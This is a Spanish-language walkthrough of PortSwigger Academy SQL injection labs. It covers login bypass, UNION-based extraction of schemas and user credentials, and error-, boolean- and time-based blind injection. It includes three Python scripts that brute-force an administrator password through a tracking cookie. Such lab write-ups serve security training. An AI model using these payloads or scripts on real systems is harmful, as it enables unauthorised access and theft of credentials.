# Inyecciones SQL

## cheatsheet


## Laboratorios

### Reto 1 Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Para resolver el laboratorio, realice un ataque de inyección SQL que haga que la aplicación muestre uno o más productos no lanzados.

En la url podemos emplear una vulnerabilidad típica usando las comillas y comentando lo siguiente de esta forma podemos hacerlo:

```bash
https://web-security-academy.net/filter?category=Pets
```
Para explotarla podemos usar `test' or 1=1-- -` donde 1=1 siempre se va a dar  y los guiones posteriores sirven para comentar lo que viene siguiente

```bash
https://web-security-academy.net/filter?category=Pets' or 1=1-- -
```

Obtenemos todos los procutos esten o no lanzados. si quisieramos solo ver los que no estan lanzados , tendriamos que usar esta sentencia:

```bash
https://web-security-academy.net/filter?category=Pets' or released=0-- -
```


### Reto 2: Vulnerabilidad de inyección SQL que permite eludir el inicio de sesión

Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión.

Para resolver el laboratorio, realice un ataque de inyección SQL que inicie sesión en la aplicación como administrator usuario.

Para resolver este reto , he realizado un ataque parecido al reto anterior en un panel de login para ello he utilizado lo siguiente:

```bash
User: administrator
passwd: test' or 1=1-- -
```

De esta manera hacemos un bypass del login.

### Reto 3 Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Se puede usar un ataque UNION para recuperar los resultados de una consulta inyectada.

Para resolver el laboratorio, muestre la cadena de versión de la base de datos,  es importante destacar que las sentencias de SQL son distintas para cada base de datos.

Para lograrlo:

- Se intercepta la solicitud que filtra los productos por categoría y se modifica el parámetro ‘category’ hay que tener en cuenta que para extraer datos no nos vale lo anterior que muestra todo.

- Primero se determina cuántas columnas devuelve la consulta y cuáles aceptan datos de tipo texto podemos usar ORDER BY e ir probando en nuestro caso son dos columnas. 
```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

Esto es necesario para que el ataque UNION funcione correctamente, la letras a y b se deberian de mostrar en alguna parte de la página, la tabla `dual` es una tabla especial que tiene oracle de una fila y columna
 para hacer cálculos.

```
https://web-security-academy.net/filter?category=Pets' union select 'a','b' from dual-- -
```

- Una vez identificadas las columnas, se utiliza una inyección que consulta la tabla ‘v$version’, propia de Oracle, para obtener el valor del campo ‘BANNER’, que contiene información sobre la versión de la base de datos.

- Ejemplo de oracle
```
https://web-security-academy.net/filter?category=Pets' union select 'a',banner from v$version-- -
```

- Ejemplo de MySQL y Microsoft

```
https://web-security-academy.net/filter?category=Pets' union select 'a',@@version-- -
```

Otros ejemplos: 

- Extraer las bases de datos que hay en MYSQL

```
https://web-security-academy.net/filter?category=Pets' union select 'a',schema_name from information_schema.schemata-- -
```

Enumerararlas usando `group_concat()`para concatenar todos los nombres en una sola fila y poder verlos todos juntos

```
https://web-security-academy.net/filter?category=' union select NULL,group_concat(schema_name) from information_schema.schemata-- -
```

- Enumeramos todas las tablas de todas las bases de datos

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables-- -
```

- Enumeramos las tablas de una base de datos en específico por ejemplo 'academy_labs'

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables where table_schema='academy_labs'-- -
```

### Reto 4: ataque de inyección SQL, que enumera el contenido de la base de datos en bases de datos que no son de Oracle

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación para que pueda utilizar un ataque UNION para recuperar datos de otras tablas.

La aplicación tiene una función de inicio de sesión y la base de datos contiene una tabla que contiene nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, luego recuperar el contenido de la tabla para obtener el nombre de usuario y la contraseña de todos los usuarios.

Para resolver el laboratorio, inicie sesión como administrador usuario.

El objetivo final es extraer las credenciales de todos los usuarios (incluido el administrador) a partir de las siguientes etapas:

1º Descubrir cuántas columnas devuelve la consulta original y qué tipo de datos aceptan, usando un payload simple para comprobarlo.
2º Listar todas las tablas existentes en la base de datos consultando ‘information_schema.tables‘, una tabla especial que contiene metadatos.
3º Identificar la tabla que almacena los usuarios y contraseñas, observando su nombre en la respuesta.
4º Listar las columnas de esa tabla, consultando ‘information_schema.columns‘ y filtrando por el nombre de tabla que acabamos de encontrar.
5º Extraer los valores de las columnas relevantes, mostrando directamente los nombres de usuario y contraseñas de todos los usuarios.
6º Una vez obtenida la contraseña del administrador, podemos usarla para iniciar sesión en la aplicación y completar el laboratorio.


Para hacer un paso a paso :

primero comprobamos si es vulnerable a inyeccion SQL colocando `' -- -`

```
https://web-security-academy.net/filter?category=' -- -
```
Si vemos que nos devuelve algo y no un internal server error seguimos con el siguiente paso

```
https://web-security-academy.net/filter?category=' union select NULL,NULL-- -
```
Vamos a intentar extraer el esquema de la bases de datos de la siguienta manera

```
https://web-security-academy.net/filter?category=' union select NULL,schema_name from information_schema.schemata-- -
```

Elegimos la base de datos public es la que parece más interesante 

```
https://web-security-academy.net/filter?category=' union select NULL,table_name from information_schema.tables where table_schema='public'-- -
```

Mostramos las columnas de la BD public y de la tabla users_xguocv
```
https://web-security-academy.net/filter?category=' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users_ednwmh'-- -
```
Extraemos todos los usuarios y contraseñas de las tablas incluida la del administrado

```
https://web-security-academy.net/filter?category=' union select username_jgugaj,password_wfzhqa from public.users_ednwmh-- -
```
otra forma de hacerlo:

```
https://web-security-academy.net/filter?category=' union select NULL,concat(username_jgugaj,':',password_wfzhqa) from public.users_ednwmh-- -
```

## Reto 6: Ataque de inyección SQL, listando el contenido de la base de datos en Oracle

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque UNION para recuperar datos de otras tablas.

La aplicación cuenta con una función de inicio de sesión y la base de datos contiene una tabla con nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, y luego recuperar su contenido para obtener los nombres de usuario y las contraseñas de todos los usuarios.

Para resolver el laboratorio, inicie sesión como administrator .

- Primero se determina cuántas columnas como en el caso anterior

```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

Usamos la tabla `dual` es una tabla especial que tiene oracle de una fila y columna para hacer cálculos y comprobar si se ve los dos caracteres.

```
https://web-security-academy.net/filter?category=Pets' union select 'a','b' from dual-- -
```

Para obtener todas las tablas  usamos la siguiente sentencia:
```
https://web-security-academy.net/filter?category=' UNION SELECT table_name, null FROM all_tables-- -
```

para enumerar las columnas de la tabla de usuarios `USERS_PCJYFM` realizamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_PCJYFM'-- -
```
Por último enumeramos los usuarios y las contraseñas de los usuarios guardados.

```
https://web-security-academy.net/filter?category=' UNION SELECT USERNAME_UPRTIQ, PASSWORD_KJOVDN FROM USERS_PCJYFM-- -
```

## Reto 7: Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. El primer paso de este tipo de ataque es determinar el número de columnas que devuelve la consulta. Posteriormente, se utilizará esta técnica en laboratorios posteriores para construir el ataque completo.

Para resolver el laboratorio, determine la cantidad de columnas devueltas por la consulta realizando un ataque UNION de inyección SQL que devuelva una fila adicional que contenga valores nulos.


1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 3-- -
```

3º usamos Null para comprobarlas 

```
https://web-security-academy.net/filter?category=Pet' union select NUll,NUll,NUll-- -
```

## Reto 8: Ataque UNION de inyección SQL, búsqueda de una columna que contiene texto

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, primero se debe determinar el número de columnas devueltas por la consulta. Puede hacerlo utilizando una técnica que aprendió en un laboratorio anterior . El siguiente paso es identificar una columna compatible con datos de cadena.

El laboratorio proporcionará un valor aleatorio que deberá incluir en los resultados de la consulta. Para resolverlo, realice un ataque de inyección SQL UNION que devuelva una fila adicional con el valor proporcionado. Esta técnica le ayudará a determinar qué columnas son compatibles con datos de cadena.

1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 3-- -
```

3º usamos Null para comprobarlas y metemos la cadena aleatoria 

```
https://web-security-academy.net/filter?category=' union select NUll,'0LYbaS',NUll-- -
```

## Reto 9: Ataque UNION de inyección SQL, recuperando datos de otras tablas

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas. Para construir dicho ataque, es necesario combinar algunas de las técnicas aprendidas en laboratorios anteriores.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password.

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como el administratorusuario.

1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

3º usamos Null para comprobarlas y metemos la cadena aleatoria 

```
https://web-security-academy.net/filter?category=' union select NUll,NUll-- -
```

4º mostramos el contenido de las BD existentes 

```
https://web-security-academy.net/filter?category=' union select NUll,schema_name from information_schema.schemata-- -
```

5º Mostramos las tablas existentes de la BD "public"

```
https://web-security-academy.net/filter?category=' union select NUll,table_name from information_schema.tables where table_schema='public'-- -
```

6º Mostramos usuarios y contraseña de las tablas 

```
https://web-security-academy.net/filter?category=' union select username,password from public.users-- -
```

## Reto 10: Ataque UNION de inyección SQL, recuperando múltiples valores en una sola columna

Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque UNION para recuperar datos de otras tablas.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password.

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y utilice la información para iniciar sesión como el administrator usuario.

1º comprobamos que se puede hacer la inyección SQL para ello empleamos la siguiente sentencia

```
https://web-security-academy.net/filter?category=Pet'-- -
```

2º comprobamos cuantas columnas hay usando `order by ?`

```
https://web-security-academy.net/filter?category=Pet' order by 2-- -
```

3º usamos Null para comprobarlas y metemos la cadena aleatoria 

```
https://web-security-academy.net/filter?category=' union select NUll,NUll-- -
```

4º mostramos el contenido de las BD existentes 

```
https://web-security-academy.net/filter?category=' union select NUll,schema_name from information_schema.schemata-- -
```

5º Mostramos las tablas existentes de la BD "public"

```
https://web-security-academy.net/filter?category=' union select NUll,table_name from information_schema.tables where table_schema='public'-- -
```

6º Enumeramos las columnas de la tabla usuarios de la BD public
```
https://web-security-academy.net/filter?category=' union select NUll,column_name from information_schema.columns where table_schema='public' and table_name='users'-- -
```

7º Enumeramos los usuarios y las contraseñas
```
https://web-security-academy.net/filter?category=' union select NUll,username||':'||password from users-- -
```

## Reto 11: Inyección SQL ciega con respuestas condicionales

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

No se devuelven los resultados de la consulta SQL ni se muestran mensajes de error. Sin embargo, la aplicación incluye un Welcome backmensaje en la página si la consulta devuelve alguna fila.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password. Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administratorusuario.

Para resolver el laboratorio, inicie sesión como administrator usuario.

- Solución:

La vulnerabilidad está en la cookie de tracking que la aplicación utiliza para análisis. Aprovechamos ese valor para inyectar condiciones booleanas y observar si se cumple o no, basándonos únicamente en si aparece un mensaje del tipo “Welcome back” en la respuesta.

Usamos esta técnica para:

Confirmar la existencia de una tabla ‘users‘ y un usuario ‘administrator‘.
Determinar la longitud exacta de la contraseña del administrador.
Extraer el valor carácter por carácter usando funciones como ‘SUBSTRING‘.


Un ejemplo sería:

1º comprobamos cuantas columnas tiene
Trakingid: AdfaSDFsDFa' order by 1-- -

Comprobamos que si se da la vulnerabilidad  nos devuelve "Welcome back" 

2º podemos probar si funciona colocando el Null, que en nuestro caso si funciona , ademas a proba si aparece una palabra que nosotros queramos en alguna parte de la Web

Trakingid: AdfaSDFsDFa' union select Null-- -

Trakingid: AdfaSDFsDFa' union select 'test'-- - 

Sin embargo vemos que no aparece nada en la web , es por eso que se llama `blind SQL` por lo tanto solo sabemos si nuestra query funciona cunado aparece y desaparece `Welcome back`

3º Lo siguiente que podemos probar probar los condicionales esto es: 

- Trakingid: AdfaSDFsDFa' and 'a'='a'-- -

Esto hace que si se da la condicion se muestre `Welcome back` y si no se da desaparece.

4º El siguiente paso seria utilizar query dentro de query esto quiere decir:

- Trakingid: AdfaSDFsDFa' and (select 'a')='a'-- -

de esta forma se nos devolvera `Welcome back`

5º El siguiente paso es como sabemos que hay un usuario administrator podemos ir probado 

- Trakingid: AdfaSDFsDFa' and (select 'a' from users where username='administrator')='a'-- -

6º El siguiente paso es ver si podemos sacar mas contenido con las siguiente sentencia, `substring(username,1,1)` hacemos lo mismo que la anterior 
pero de otra forma vemos que en el campo username el primer caracter es la 'a' que coincide con la 'a' de administrador y nos devuelve el welcome Back

- Trakingid: AdfaSDFsDFa' and (select substring(username,1,1) from users where username='administrator')='a'-- -

si problamos la siguiente sentencia esta no nos devolveria el mensaje esto es util porque podemos poner otro campo en vez del username, ed decir el password para 
ir sacando poco a poco la contraseña 

- Trakingid: AdfaSDFsDFa' and (select substring(username,2,1) from users where username='administrator')='a'-- -

Para el campo de contraseña: ¿El primer caracter de la contraseña es una 'a'? , si sale el mensaje si que lo es , si no sale 
el mensaje no lo es.

- Trakingid: AdfaSDFsDFa' and (select substring(password,1,1) from users where username='administrator')='a'-- -

7º Ahora vamos a intentar sacar la longitud de la contraseña, para ello solo saldra el mensaje si la longitud de la contraseña es mayor a 10.

- Trakingid: AdfaSDFsDFa' and (select 'a' from users where username='administrator' and length(password)>=20)='a'-- -

8º Vamos a hacer un script en python para que nos saque la contraseña rápida utilizando un ataque de fuerza bruta:

```python
#!/usr/bin/env python3

from pwn import log
from termcolor import colored
import requests
import signal
import string
import sys
import time

# Configuración general
TARGET_URL = "https://0a52006104667f7e81bf217b0076009b.web-security-academy.net"
TRACKING_ID_BASE = "F8zRFYtsp3KWQmFA"
SESSION_COOKIE = "Yo1gFnBAAOLMrV0wWCLTRKEj6Ra83Mam"
USERNAME = "administrator"
MAX_PASSWORD_LENGTH = 20
CHARS = string.ascii_lowercase + string.digits

# Manejo de Ctrl+C
def def_handler(sig, frame):
    print(colored("\n[!] Ataque interrumpido por el usuario", "red"))
    p1.failure("Proceso detenido.")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Logging
p1 = log.progress("SQL Injection")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta...")
    time.sleep(1)

    password = ""
    p2 = log.progress("Contraseña descubierta")

    for position in range(1, MAX_PASSWORD_LENGTH + 1):
        for character in CHARS:
            injection = f"{TRACKING_ID_BASE}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='{USERNAME}')='{character}'-- -"
            cookies = {
                'TrackingId': injection,
                'session': SESSION_COOKIE
            }

            p1.status(f"Probando posición {position} con caracter '{character}'")

            try:
                r = requests.get(TARGET_URL, cookies=cookies, timeout=5)

                if "Welcome back!" in r.text:
                    password += character
                    p2.status(password)
                    break

            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Error en la petición: {e}", "red"))
                continue

    return password


if __name__ == "__main__":
    print(colored("[*] Ataque iniciado...", "cyan"))
    final_password = makeSQLI()
    print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))
```

## Reto 12: Inyección SQL ciega con errores condicionales 

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y la aplicación no responde de forma diferente según si la consulta devuelve filas o no. Si la consulta SQL genera un error, la aplicación devuelve un mensaje de error personalizado.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordNecesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administratorusuario.

Para resolver el laboratorio, inicie sesión como administrator usuario. 

La idea es confirmar que la consulta es vulnerable a la inyección.

- Verificar que existe una tabla ‘users‘ y un usuario ‘administrator‘.
- Descubrir la longitud de la contraseña del administrador.
- Extraer la contraseña carácter por carácter, forzando errores solo cuando la condición evaluada es verdadera.
- Para provocar errores intencionados, se usa la función ‘TO_CHAR(1/0)‘ (división por cero en Oracle), dentro de expresiones ‘CASE WHEN‘ que evalúan condiciones booleanas. 
- La idea es generar un error solo cuando la condición se cumple, lo que permite inferir información sin necesidad de ver los resultados directamente.

Vemos que si le pasamos esta query va existir, previamente he probado el caso típico y hasta que he visto que es de Oracle
```
Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
```

De esta manera podemos averiguar cuál es la longitud de la cadena de la contraseña porque nos devuelve un error 500 
```
Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
```

De esta forma pruebo cual seria el primer carácter de la contraseña por ejemplo la `r` al igual que el anterior podemos ir iterando para 
averiguar toda la contraseña.
```
Cookie: TrackingId=cMkoRqzxe2swLOUK'||(SELECT CASE WHEN substr(password,1,1)='r' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
```

De la misma forma que el anterior hacemos un script para ir probando uno a uno y comprobar que sale un error 500 
```python
#!/usr/bin/env python3

from pwn import log
from termcolor import colored
import requests
import signal
import string
import sys
import time

# Configuración general
TARGET_URL = "https://0a9000d90401150b80e712e400a40014.web-security-academy.net"
TRACKING_ID_BASE = "pV6VIodNebTE2XMw"
SESSION_COOKIE = "wUeRGHgmE6wlTdCuo8BEmGyPNTD272Vk"
USERNAME = "administrator"
MAX_PASSWORD_LENGTH = 20
CHARS = string.ascii_lowercase + string.digits

# Manejo de Ctrl+C
def def_handler(sig, frame):
    print(colored("\n[!] Ataque interrumpido por el usuario", "red"))
    p1.failure("Proceso detenido.")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Logging
p1 = log.progress("SQL Injection")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta...")
    time.sleep(1)

    password = ""
    p2 = log.progress("Contraseña descubierta")

    for position in range(1, MAX_PASSWORD_LENGTH + 1):
        for character in CHARS:
            injection = (
                f"{TRACKING_ID_BASE}'||"
                f"(SELECT CASE WHEN substr(password,{position},1)='{character}' "
                f"THEN to_char(1/0) ELSE '' END FROM users WHERE username='{USERNAME}')||'"
            )

            cookies = {
                'TrackingId': injection,
                'session': SESSION_COOKIE
            }

            try:
                r = requests.get(TARGET_URL, cookies=cookies, timeout=5)

                if r.status_code == 500:
                    password += character
                    p2.status(password)
                    print(colored(f"[✓] Letra correcta: '{character}' → {password}", "green"))
                    break

            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Error en la petición: {e}", "red"))
                continue

    return password

if __name__ == "__main__":
    print(colored("[*] Ataque iniciado...", "cyan"))
    final_password = makeSQLI()
    print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))

```

## Reto 13: Inyección SQL basada en errores visibles
Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. No se devuelven los resultados de la consulta SQL.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordPara resolver el laboratorio, encuentre una forma de filtrar la contraseña. administratorusuario, luego inicie sesión en su cuenta.

Para resolverlo paso a paso:

1º Provocar un error de sintaxis añadiendo un carácter de comilla comprobando que nos da un internal server error.

```
TrackingId=' order by 1-- -
```

2º Comentar el resto de la consulta para validarla sintácticamente.
```
TrackingId=' order by Null-- -
```
y probar localizando cadenas de texto, sin embargo vemos que no aparece

```
TrackingId=' order by 'test'-- -
```

3º Utilizar subconsultas SQL combinadas con ‘CAST‘ para extraer información. 
```
TrackingId=' or 1=cast((select 1) as INT)-- -
```

4º Ajustar la consulta para obtener solo una fila y evitar errores de tipo usando limit.
```
TrackingId=' or 1=cast((select username from users ) as INT)-- -
```

5º Filtrar primero el nombre de usuario del administrador y después su contraseña.
```
TrackingId=' or 1=cast((select username from users limit 1) as INT)-- -
TrackingId=' or 1=cast((select password from users limit 1) as INT)-- -
```

## Reto 14: Inyección SQL ciega con retrasos de tiempo 
Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de forma diferente si la consulta devuelve filas o genera un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retardos condicionales para inferir información.

Para resolver el laboratorio, explote la vulnerabilidad de inyección SQL para provocar un retraso de 10 segundos. 

1º El primer paso sería intentar comprobar que tipo de base de datos tiene por detrás

```
TrackingId=' order by 1-- -
```

2º Si no encotramos que tipo de de BD hay porque no nos muestra nada podemos ir probando para ver si con algún comando 
podemos hacer el `delay`

```
Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)
``` 

para nuestro ejemplo podemos probar:

```
TrackingId=' and sleep(10)-- -
```

```
TrackingId='|| pg_sleep(10)-- -
```

## Reto 15: Inyección SQL ciega con retrasos de tiempo y recuperación de información 
Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de forma diferente si la consulta devuelve filas o genera un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retardos condicionales para inferir información.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password Necesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator usuario.

Para resolver el laboratorio, inicie sesión como administrator usuario. 

1º Comprobar que BD nos encontramos, lo podemos hacer probando los ejemplos anteriores.

2º Como hemos visto que la base de datos es posgresSQL podemos usar las sentencias de porque hemos  SELECT CASE WHEN(se hace la comparación) y se pone el delay de esta forma 
podemos saber los caracteres de la contraseña.
TrackingId=test'%3b SELECT CASE WHEN (username='administrator' and length(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- 


un script para automatizar el proceso como los ejemplos anteriores puede ser esos:

```python
#!/usr/bin/env python3

from pwn import log
from termcolor import colored
import requests
import signal
import string
import sys
import time

# Configuración general
TARGET_URL = "https://0a04002104584715a44312a100f30080.web-security-academy.net"
TRACKING_ID_BASE = "7a41yOgDxN6nlSXJ"
SESSION_COOKIE = "fjEer6pflUWbcdNDpmhURW5O4YqwDCv6"
USERNAME = "administrator"
MAX_PASSWORD_LENGTH = 20
CHARS = string.ascii_lowercase + string.digits
DELAY_SECONDS = 5
TIME_THRESHOLD = 4.5  # umbral para detectar si hubo retraso por pg_sleep

# Manejo de Ctrl+C
def def_handler(sig, frame):
    print(colored("\n[!] Ataque interrumpido por el usuario", "red"))
    p1.failure("Proceso detenido.")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Logging
p1 = log.progress("SQL Injection")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta...")
    time.sleep(1)

    password = ""
    p2 = log.progress("Contraseña descubierta")

    for position in range(1, MAX_PASSWORD_LENGTH + 1):
        found = False
        for character in CHARS:
            # Payload en texto plano
            payload = (
                f"{TRACKING_ID_BASE}'; SELECT CASE WHEN "
                f"(username='{USERNAME}' AND substring(password,{position},1)='{character}') "
                f"THEN pg_sleep({DELAY_SECONDS}) ELSE pg_sleep(0) END FROM users--"
            )

            # Codificar correctamente para la cookie
            encoded_payload = requests.utils.quote(payload)

            cookies = {
                'TrackingId': encoded_payload,
                'session': SESSION_COOKIE
            }

            start = time.time()
            try:
                requests.get(TARGET_URL, cookies=cookies, timeout=DELAY_SECONDS + 1)
            except requests.exceptions.ReadTimeout:
                # Timeout = delay confirmado
                password += character
                p2.status(password)
                print(colored(f"[✓] Letra correcta: '{character}' → {password}", "green"))
                found = True
                break

            end = time.time()
            elapsed = end - start

            if elapsed > TIME_THRESHOLD:
                password += character
                p2.status(password)
                print(colored(f"[✓] Letra correcta: '{character}' → {password}", "green"))
                found = True
                break

        if not found:
            print(colored("[!] Fin del password o protegido por WAF", "yellow"))
            break

    return password

if __name__ == "__main__":
    print(colored("[*] Ataque iniciado...", "cyan"))
    final_password = makeSQLI()
    print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))


```

En el caso de que fuera MySQL podemos probar alternativas en la sentencias porque no son la misma sintaxis:
Algo equivalente sería:
```
select username from users where id='1' and if(substr((select password from users where username='administrator'),1,1)='a',sleep(5),sleep(0))-- -
```






## ¿Qué es una SQLI ?

